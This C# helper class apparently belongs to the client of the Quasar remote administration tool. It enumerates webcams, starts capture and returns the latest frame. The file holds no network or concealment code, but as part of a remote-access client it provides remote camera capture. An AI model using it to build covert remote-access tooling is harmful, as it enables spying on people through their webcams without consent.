using System;
using System.Drawing;
using System.Threading;
using AForge.Video;
using AForge.Video.DirectShow;

namespace Quasar.Client.Helper
{
    public class WebcamHelper
    {
        private readonly object _lock = new object();
        private Bitmap _currentFrame;
        private bool _isRunning = false;
        private VideoCaptureDevice _videoDevice;
        private int _width;
        private int _height;

        public void StartWebcam(int webcamIndex)
        {
            if (_isRunning) return;

            FilterInfoCollection captureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            if (captureDevices.Count == 0)
            {
                Console.WriteLine("No webcam detected.");
                return;
            }

            if (webcamIndex < 0 || webcamIndex >= captureDevices.Count)
            {
                Console.WriteLine("Invalid selection.");
                return;
            }

            _videoDevice = new VideoCaptureDevice(captureDevices[webcamIndex].MonikerString);
            _videoDevice.NewFrame += new NewFrameEventHandler(FinalFrame_NewFrame);
            _videoDevice.Start();
            _isRunning = true;
        }

        public string[] GetWebcams()
        {
            FilterInfoCollection captureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            string[] webcams = new string[captureDevices.Count];
            for (int i = 0; i < captureDevices.Count; i++)
            {
                webcams[i] = captureDevices[i].Name;
            }
            return webcams;
        }

        public void StopWebcam()
        {
            if (!_isRunning) return;

            try
            {
                _videoDevice.SignalToStop();
                _videoDevice.WaitForStop();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stopping webcam: {ex.Message}");
            }
            finally
            {
                _videoDevice.NewFrame -= FinalFrame_NewFrame;
                _videoDevice = null;
                _isRunning = false;
            }
        }

        public Bitmap GetLatestFrame()
        {
            lock (_lock)
            {
                Thread.Sleep(22); // is this a shitty way to do this? yes. But every other way I tried was even shittier or didn't work at all. Love it or hate it, it works.
                return _currentFrame?.Clone() as Bitmap;
            }
        }

        public Bounds GetBounds()
        {
            lock (_lock)
            {
                return new Bounds { Width = _width, Height = _height };
            }
        }

        private void FinalFrame_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            lock (_lock)
            {
                _currentFrame?.Dispose();
                _currentFrame = (Bitmap)eventArgs.Frame.Clone();
                _width = _currentFrame.Width;
                _height = _currentFrame.Height;
            }
        }
    }

    public struct Bounds
    {
        public int Width { get; set; }
        public int Height { get; set; }
    }
}
